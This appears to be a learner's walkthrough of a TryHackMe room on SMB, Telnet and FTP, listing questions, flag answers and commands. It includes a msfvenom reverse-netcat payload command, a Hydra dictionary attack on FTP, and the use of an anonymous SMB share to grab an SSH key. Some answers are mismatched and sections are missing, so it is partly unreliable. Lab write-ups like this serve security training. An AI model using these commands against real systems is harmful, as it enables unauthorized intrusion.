Task 1: Get Connected

[*] This room will explore common Network Service vulnerabilities and misconfigurations, but in order to do that, we'll need to do a few things first!

******************************************************************************************************************************************************************************************************************************************

Task 2: Understanding SMB

[*] SMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network.

[*] Read and understand how does SMB work in this task 

    [+] Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support.

******************************************************************************************************************************************************************************************************************************************

Task 3: Enumerating SMB 

[*] Deploy the VM 

    [+] Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.

    [+] SMB: Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information â€” you'd be surprised what is sometimes included on these shares. 

    [+] Port Scanning: The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine. 

    [+] Enum4Linux: Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems

    [+] Read this task and understand all options for this.

[Question 1]: Conduct an nmap scan of your choosing, How many ports are open?

    [!] Answer: 3

[Question 2]:  What ports is SMB running on?

    [+] We have hint: Look under OS information, it might be hard to spot!

    [!] Answer: POLOSMB

[Question 5]: What operating system version is running?

    [!] Answer: 6.1

[Question 6]: What share sticks out as something we might want to investigate?   

    [!] Answer: profiles

******************************************************************************************************************************************************************************************************************************************

Task 4: Exploiting SMB 

[Question 1]:
What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

[*] The answer of the first question can be found in the last bit of the text in this task

    [!] Answer: smbclient //10.10.10.2/secret -U suit -p 445

[Question 2]: No answer needed 

    [+] Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:

        [+] using the username "Anonymous"

        [+] connecting to the share we found during the enumeration stage

        [+] and not supplying a password. 

[Question 3]: Does the share allow anonymous access? Y/N?

    [!] Answer: Y

[Question 4]: Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to? 

    [!] Answer: John Cactus

[Question 5]: What service has been configured to allow him to work from home?

    [!] Answer: ssh 

[Question 6]: Okay! Now we know this, what directory on the share should we look in?

    [!] Answer: id_rsa 

[Question 7]: What is the smb.txt flag? 

    [+] We connect with ssh 

    [+] Change permission for id_rsa.ssh

    [+] Connet to catus@<10.10.130.140>

    [+] Cat smb.txt

    [!] Answer: THM{smb_is_fun_eh?}

******************************************************************************************************************************************************************************************************************************************

Task 5: Understanding Telnet

[*] Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.  
    
[*] The telnet client will establish a connection with the server.

[*] The user connects to the server by using the Telnet protocol, which means entering "telnet" into a command prompt. 

[Question 1]: What is Telnet?  

    [!] Answer: Application protocol

[Question 2]: What has slowly replaced Telnet?  

    [!] Answer: ssh

[Question 3]: How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?

    [!] Answer: telnet 10.10.10.3 23

[Question 4]: The lack of what, means that all Telnet communication is in plaintext?

    [+] We have hint: What does the modern internet use to communicate securely?

    [!] Answer: encryption

******************************************************************************************************************************************************************************************************************************************

Task 6: Enumerating Telnet 

[*] We will use nmap in this task, you must to have knowledge about nmap and nmap's options.

[Question 1]: How many ports are open on the target machine?    

    [+] To continue type in the command nmap -T4 -A -p- <IP of VM> in a terminal. This wil take some time because it will scan all ports.

    [!] Answer: 1

[Question 2]: What port is this?

    [!] Answer: 8012

[Question 3]: This port is unassigned, but still lists the protocol it's using, what protocol is this?     

    [!] Answer: TCP

[Question 4]: Now re-run the nmap scan, without the -p- tag, how many ports show up as open?

    [+] nmap -T4 -A <ip machine>

    [!] Answer: 0

[Question 5]: Based on the title returned to us, what do we think this port could be used for?

    [+] nmap -T4 -A -p- <ip machine>

    [!] Answer: a backdoor 

[Question 6]: Who could it belong to? Gathering possible usernames is an important step in enumeration.

    [!] Answer: skidy

[Question 7]: No answer needed 

******************************************************************************************************************************************************************************************************************************************

Task 7: Exploiting Telnet 

[*] Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier.

[Question 1]: Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.

    [!] Answer: No answer needed 

[Question 2]: Great! It's an open telnet connection! What welcome message do we receive? 

    [+] We have hint: Remember, telnet is not running on its default port. Use your answer from task 6, question 2.

[Question 3]: Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N) 

    [!] Answer: N

    [+]If using your own machine with the OpenVPN connection, use:

        sudo tcpdump ip proto \\icmp -i tun0

    [+]If using the AttackBox, use:

        sudo tcpdump ip proto \\icmp -i eth0

[Question 4]: Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)

    [!]  Answer: No answer needed 

[Question 5]: What word does the generated payload start with?

    [+] msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R

Task 8: Understanding FTP

[*] File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network.

[*] It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.

    [+] Read and understand how does FTP work 

[Question 1]: What communications model does FTP use?

    [!] Answer: Clinet-server

[Question 2]: What's the standard FTP port?

******************************************************************************************************************************************************************************************************************************************

Task 10: Exploiting FTP

[*] Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.

[*] With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords).

[*] Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub here.

    [+] hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV <IP of VM> ftp

[Question 1]: What is the password for the user "mike"?
